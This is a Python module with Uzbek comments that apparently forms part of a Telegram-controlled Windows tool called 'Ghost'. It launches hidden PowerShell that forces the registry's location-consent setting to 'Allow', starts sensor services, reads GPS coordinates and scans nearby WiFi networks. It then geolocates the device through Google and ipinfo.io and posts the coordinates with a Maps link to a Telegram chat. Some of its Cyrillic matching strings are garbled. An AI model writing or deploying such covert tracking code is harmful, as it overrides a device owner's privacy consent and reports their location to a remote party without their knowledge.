# location_accurate.py - v3.1.0 LANGUAGE-INDEPENDENT (100% Async)
"""
Tildan mustaqil aniq joylashuv aniqlash:
1. Windows Location API
2. WiFi scanning (PowerShell JSON)
3. Google Geolocation API

TUZATILDI: netsh tilidan qat'i nazar ishlaydi
"""

import asyncio
import logging
import json
import urllib.request
import re
from typing import Optional, Dict, List, Any

logger = logging.getLogger(__name__)

# ==================== WINDOWS LOCATION API (GPS PRIORITIZED) ====================
class WindowsLocationAPI:
    """Windows 10/11 Location API - GPS Prioritized"""
    
    @staticmethod
    async def get_location(timeout: int = 15) -> Optional[Dict[str, Any]]:
        """Windows Location API orqali joylashuvni olish - GPS afzal"""
        try:
            # Avval GPS yoqilganligini tekshirish va yoqish
            enable_script = '''
try {
    # Location Services yoqish
    $regPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location"
    if (Test-Path $regPath) {
        Set-ItemProperty -Path $regPath -Name "Value" -Value "Allow" -ErrorAction SilentlyContinue
    }
    
    # Sensor xizmati yoqish
    Start-Service -Name "SensorService" -ErrorAction SilentlyContinue
    Start-Service -Name "SensrSvc" -ErrorAction SilentlyContinue
    
    Write-Output "OK"
} catch {
    Write-Output "SKIP"
}
'''
            
            # GPS/Location yoqishga harakat
            enable_proc = await asyncio.create_subprocess_exec(
                "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", enable_script,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                creationflags=0x08000000  # CREATE_NO_WINDOW
            )
            await asyncio.wait_for(enable_proc.communicate(), timeout=5)
            
            # HIGH ACCURACY rejimida GPS dan foydalanish
            ps_script = '''
Add-Type -AssemblyName System.Device

# GeoCoordinateWatcher yaratish
$watcher = New-Object System.Device.Location.GeoCoordinateWatcher([System.Device.Location.GeoPositionAccuracy]::High)

# GPS yoqish
$watcher.Start()

# GPS tayyor bo'lishini kutish (15 sekund)
$timeout = [datetime]::Now.AddSeconds(15)
$bestLocation = $null
$bestAccuracy = 999999

while ([datetime]::Now -lt $timeout) {
    Start-Sleep -Milliseconds 500
    
    if ($watcher.Status -eq 'Ready') {
        $coord = $watcher.Position.Location
        
        if (-not $coord.IsUnknown) {
            $accuracy = $coord.HorizontalAccuracy
            
            # Eng yaxshi aniqlikni saqlash
            if ($accuracy -lt $bestAccuracy) {
                $bestAccuracy = $accuracy
                $bestLocation = @{
                    latitude = $coord.Latitude
                    longitude = $coord.Longitude
                    accuracy = $accuracy
                    altitude = $coord.Altitude
                    speed = $coord.Speed
                }
            }
            
            # Agar GPS aniqlik yaxshi bo'lsa (100m dan kam) - to'xtatish
            if ($accuracy -lt 100) {
                break
            }
        }
    }
}

$watcher.Stop()

if ($bestLocation) {
    $bestLocation | ConvertTo-Json
} else {
    @{error = "GPS mavjud emas yoki joylashuv o'chirilgan"} | ConvertTo-Json
}
'''
            
            proc = await asyncio.create_subprocess_exec(
                "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                creationflags=0x08000000  # CREATE_NO_WINDOW
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            except asyncio.TimeoutError:
                logger.warning("Windows GPS vaqti tugadi")
                proc.kill()
                return None
            
            output = stdout.decode('utf-8', errors='ignore')
            
            if not output:
                return None
            
            data = json.loads(output)
            
            if 'error' in data:
                logger.warning(f"Windows GPS: {data['error']}")
                return None
            
            accuracy = float(data.get('accuracy', 0))
            
            # Manba nomini aniqlik bo'yicha belgilash
            if accuracy < 50:
                source = 'GPS (Yuqori aniqlik)'
            elif accuracy < 500:
                source = 'GPS (O\'rtacha aniqlik)'
            else:
                source = 'Windows Location API (WiFi/Cell)'
            
            return {
                'source': source,
                'lat': float(data.get('latitude', 0)),
                'lon': float(data.get('longitude', 0)),
                'accuracy': accuracy,
                'altitude': float(data.get('altitude', 0)) if data.get('altitude') else None,
                'speed': float(data.get('speed', 0)) if data.get('speed') else None,
            }
            
        except Exception as e:
            logger.error(f"Windows GPS xatosi: {e}")
            return None


# ==================== WIFI SCANNER (TUZATILGAN - TILDAN MUSTAQIL) ====================
class WiFiScanner:
    """WiFi tarmoq skaneri - Tildan mustaqil"""
    
    @staticmethod
    async def scan_networks(timeout: int = 5) -> List[Dict[str, Any]]:
        """
        TUZATILDI: PowerShell JSON orqali WiFi tarmoqlarni qidirish
        Bu usul Windows tilidan qat'i nazar ishlaydi
        """
        try:
            # PowerShell script JSON formatda WiFi ma'lumotlarini qaytaradi
            ps_script = '''
$networks = netsh wlan show networks mode=bssid | Out-String
$results = @()

$currentSSID = $null
$blocks = $networks -split "(?=SSID|Ð˜Ð¼Ñ Ñ„Ð°Ð¹Ð»Ð° Ð¸Ð´ÐµÐ½Ñ‚Ð¸Ñ„Ð¸ÐºÐ°Ñ‚Ð¾Ñ€Ð°)"

foreach ($block in $blocks) {
    if ($block -match "SSID[^:]*:[\\s]*(.*)" -or $block -match "Ð˜Ð¼Ñ Ñ„Ð°Ð¹Ð»Ð° Ð¸Ð´ÐµÐ½Ñ‚Ð¸Ñ„Ð¸ÐºÐ°Ñ‚Ð¾Ñ€Ð°[^:]*:[\\s]*(.*)") {
        $currentSSID = $matches[1].Trim()
    }
    
    if ($block -match "BSSID[^:]*:[\\s]*([0-9a-fA-F:]{17})" -or $block -match "MAC-Ð°Ð´Ñ€ÐµÑ[^:]*:[\\s]*([0-9a-fA-F:]{17})") {
        $mac = $matches[1].Trim()
        
        $signal = 0
        if ($block -match "Signal|Ð¡Ð¸Ð³Ð½Ð°Ð»[^:]*:[\\s]*(\\d+)") {
            $signal = [int]$matches[1]
        }
        
        if ($currentSSID -and $mac -match "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$") {
            $results += @{
                ssid = $currentSSID
                mac = $mac
                signal = $signal
            }
        }
    }
}

$results | ConvertTo-Json
'''
            
            proc = await asyncio.create_subprocess_exec(
                "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                creationflags=asyncio.subprocess.CREATE_NO_WINDOW if hasattr(asyncio.subprocess, 'CREATE_NO_WINDOW') else 0
            )
            
            try:
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            except asyncio.TimeoutError:
                logger.warning("WiFi qidiruv vaqti tugadi")
                proc.kill()
                return []
            
            output = stdout.decode('utf-8', errors='ignore')
            
            if not output.strip():
                return []
            
            try:
                data = json.loads(output)
                
                # Agar bitta tarmoq bo'lsa - list qilib qaytarish
                if isinstance(data, dict):
                    data = [data]
                
                networks = []
                for item in data:
                    if isinstance(item, dict) and 'mac' in item:
                        networks.append({
                            'ssid': item.get('ssid', 'Unknown'),
                            'mac': item['mac'],
                            'signal': item.get('signal', 0)
                        })
                
                logger.info(f"{len(networks)} ta WiFi tarmoq topildi")
                return networks[:10]  # Top 10
                
            except json.JSONDecodeError:
                logger.error("WiFi JSON parse xatosi")
                return []
            
        except Exception as e:
            logger.error(f"WiFi qidiruv xatosi: {e}")
            return []


# ==================== GOOGLE GEOLOCATION API ====================
class GoogleGeolocationAPI:
    """Google Geolocation API - Async"""
    
    API_URL = "https://www.googleapis.com/geolocation/v1/geolocate"
    
    @staticmethod
    async def locate_by_wifi(wifi_networks: List[Dict[str, Any]], api_key: Optional[str] = None) -> Optional[Dict[str, Any]]:
        """WiFi tarmoqlar orqali joylashuvni aniqlash"""
        try:
            if not wifi_networks:
                logger.warning("WiFi tarmoqlar yo'q")
                return None
            
            # So'rov ma'lumotlarini tayyorlash
            wifi_access_points = []
            for network in wifi_networks:
                ap = {
                    "macAddress": network['mac']
                }
                if 'signal' in network and network['signal'] > 0:
                    # Foizni dBm ga o'zgartirish (taxminiy)
                    ap['signalStrength'] = -100 + network['signal']
                wifi_access_points.append(ap)
            
            request_data = {
                "wifiAccessPoints": wifi_access_points
            }
            
            url = GoogleGeolocationAPI.API_URL
            if api_key:
                url += f"?key={api_key}"
            
            # Async HTTP so'rov
            loop = asyncio.get_event_loop()
            
            def fetch():
                request = urllib.request.Request(
                    url,
                    data=json.dumps(request_data).encode('utf-8'),
                    headers={'Content-Type': 'application/json'},
                    method='POST'
                )
                response = urllib.request.urlopen(request, timeout=10)
                return json.loads(response.read().decode())
            
            result = await loop.run_in_executor(None, fetch)
            
            if 'location' in result:
                location = result['location']
                accuracy = result.get('accuracy', 0)
                
                return {
                    'source': 'Google Geolocation (WiFi)',
                    'lat': float(location['lat']),
                    'lon': float(location['lng']),
                    'accuracy': float(accuracy),
                    'wifi_count': len(wifi_networks)
                }
            
            return None
            
        except Exception as e:
            logger.error(f"Google Geolocation API xatosi: {e}")
            return None


# ==================== ACCURATE LOCATION DETECTOR ====================
class AccurateLocationDetector:
    """Asosiy joylashuv aniqlagich - bir nechta usulni sinab ko'radi"""
    
    def __init__(self, google_api_key: Optional[str] = None):
        self.google_api_key = google_api_key
    
    async def get_best_location(self, timeout: int = 15) -> Optional[Dict[str, Any]]:
        """Eng yaxshi mavjud joylashuvni olish"""
        try:
            logger.info("Joylashuvni aniqlash boshlandi...")
            
            # Barcha usullarni parallel ravishda ishga tushirish
            tasks = [
                self._try_windows_location(),
                self._try_wifi_location(),
                self._try_ip_location(),  # IP orqali backup
            ]
            
            # Birinchi muvaffaqiyatli natija yoki hammasi tugaguncha kutish
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Muvaffaqiyatli natijalarni filtrlash
            locations = []
            for result in results:
                if isinstance(result, dict) and 'lat' in result:
                    locations.append(result)
            
            if not locations:
                logger.warning("Hech bir usul ishlamadi")
                return None
            
            # Eng yaxshi joylashuvni tanlash (GPS > WiFi > IP)
            # Eng kichik accuracy yaxshiroq
            best = min(locations, key=lambda x: x.get('accuracy', 999999))
            
            logger.info(f"Eng yaxshi joylashuv: {best['source']} (aniqlik: {best.get('accuracy', 'N/A')}m)")
            return best
            
        except Exception as e:
            logger.error(f"Joylashuvni olish xatosi: {e}")
            return None
    
    async def _try_ip_location(self) -> Optional[Dict[str, Any]]:
        """IP orqali joylashuvni aniqlash (backup usul)"""
        try:
            loop = asyncio.get_event_loop()
            
            def fetch():
                request = urllib.request.Request(
                    "https://ipinfo.io/json",
                    headers={'User-Agent': 'Ghost-Location/1.0'}
                )
                response = urllib.request.urlopen(request, timeout=10)
                return json.loads(response.read().decode())
            
            data = await loop.run_in_executor(None, fetch)
            
            if 'loc' in data:
                lat, lon = data['loc'].split(',')
                city = data.get('city', 'Noma\'lum')
                region = data.get('region', '')
                
                return {
                    'source': f'IP Address ({city})',
                    'lat': float(lat),
                    'lon': float(lon),
                    'accuracy': 10000,  # IP taxminiy 10km aniqlik
                    'city': city,
                    'region': region
                }
            
            return None
            
        except Exception as e:
            logger.error(f"IP location xatosi: {e}")
            return None
    
    async def _try_windows_location(self) -> Optional[Dict[str, Any]]:
        """Windows Location API ni sinab ko'rish"""
        try:
            return await WindowsLocationAPI.get_location(timeout=10)
        except Exception as e:
            logger.error(f"Windows location usuli xatosi: {e}")
            return None
    
    async def _try_wifi_location(self) -> Optional[Dict[str, Any]]:
        """WiFi + Google Geolocation ni sinab ko'rish"""
        try:
            # WiFi qidirish
            networks = await WiFiScanner.scan_networks(timeout=5)
            
            if not networks:
                logger.warning("WiFi tarmoqlar topilmadi")
                return None
            
            # WiFi orqali joylashuvni aniqlash
            return await GoogleGeolocationAPI.locate_by_wifi(networks, self.google_api_key)
            
        except Exception as e:
            logger.error(f"WiFi location usuli xatosi: {e}")
            return None


# ==================== TELEGRAM INTEGRATSIYA ====================
async def send_accurate_location(client, chat_id, google_api_key: Optional[str] = None):
    """Telegram'ga aniq joylashuvni yuborish"""
    try:
        msg = await client.send_message(chat_id, "📍 **Aniq joylashuv aniqlanmoqda...**\n\n⏳ Bir nechta usullar sinab ko'rilmoqda...")
        
        detector = AccurateLocationDetector(google_api_key)
        location = await detector.get_best_location(timeout=20)
        
        if not location:
            await client.edit_message(
                chat_id, msg.id,
                "❌ **Joylashuv Aniqlash Xatosi**\n\n"
                "Mumkin bo'lgan sabablar:\n"
                "• Joylashuv xizmatlari o'chirilgan\n"
                "• Yaqinlarda WiFi tarmoqlar yo'q\n"
                "• Windows Location API mavjud emas\n\n"
                "💡 Windows Sozlamalarida Location Services'ni yoqib ko'ring"
            )
            return
        
        # Natijani formatlash
        source = location['source']
        lat = location['lat']
        lon = location['lon']
        accuracy = location.get('accuracy', 'Aniqlanmadi')
        wifi_count = location.get('wifi_count', 0)
        
        text = (
            f"📍 **Aniq Joylashuv Topildi!**\n\n"
            f"🔍 **Usul:** {source}\n"
            f"📌 **Koordinatalar:** `{lat}, {lon}`\n"
            f"🎯 **Aniqlik:** ~{accuracy}m\n"
        )
        
        if wifi_count > 0:
            text += f"📡 **WiFi Tarmoqlar:** {wifi_count}\n"
        
        text += f"\n🗺️ **Google Xarita:**"
        
        await client.edit_message(chat_id, msg.id, text)
        
        # Google Maps havolasi
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        await client.send_message(chat_id, maps_url)
        
    except Exception as e:
        logger.error(f"Aniq joylashuv yuborish xatosi: {e}")
        await client.send_message(chat_id, f"❌ Xato: {str(e)}")


# ==================== EXPORT ====================
__all__ = [
    'WindowsLocationAPI',
    'WiFiScanner',
    'GoogleGeolocationAPI',
    'AccurateLocationDetector',
    'send_accurate_location',
]